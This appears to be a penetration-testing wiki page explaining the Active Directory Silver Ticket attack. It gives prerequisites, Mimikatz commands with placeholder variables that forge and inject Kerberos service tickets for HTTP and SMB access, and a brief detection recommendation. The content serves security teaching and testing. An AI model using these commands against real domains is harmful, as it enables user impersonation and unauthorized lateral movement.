---
layout: default
title: Silver Tickets
parent: Active Directory
nav_order: 17
permalink: /ad/silver/
---

# Silver Tickets
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Vulnerability

To lateralize on the network, you can forge Silver Tickets using `Mimikatz`. Silver Ticket attack consists in forging a Kerberos TGS for a service by impersonating any domain user.

## Prerequisites

* Having a SPN target and its associated SPN password hash.
* Having the domain user SID you want to impersonate.

## Exploit

Let’s assume we want to gain access to a web application hosted on IIS owned by a SPN. First, we can check we actually have not access to it.

```bash
# From a domain joined Windows computer
# It might respond "401 - Unauthorized: Access is denied due to invalid credentials"
Invoke-WebRequest -UseDefaultCredentials http://$target
```

Before forging our Silver Ticket, you need to obtain the SPN password hash of our target. Then, get the SID of the user you want to impersonate.

```bash
# From a domain joined Windows computer.
whoami /user
```

You can now forge the Silver Ticket and access your target.

```bash
# With Mimikatz.
kerberos::golden /sid:$sid /domain:$domain /ptt /target:$hostname /service:http /rc4:$hash /user:$username

# Inject the ticket in memory.
kerberos::ptt ticket.kirbi
```

You can also use this attack to access an domain computer via SMB by using the machine account SID and its associated hash.

```bash
# With Mimikatz.
kerberos::golden /sid:$sid /domain:$domain /ptt /target:$hostname /service:cifs /rc4:$hash /user:$username
```

{: .warning }
> If the $sid is **`S-1-5-21-1987370270-658905905-1781884369**-1105`, don’t take the final part after the last `-`. You will only need **`S-1-5-21-1987370270-658905905-1781884369`.**

## Useful links

* [HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket#available-services) for available services.

## Recommendations

- [ ] This method take advantage of a normal Kerberos behavior. The only thing you can do is monitor corresponding Windows events to detect and block this attack.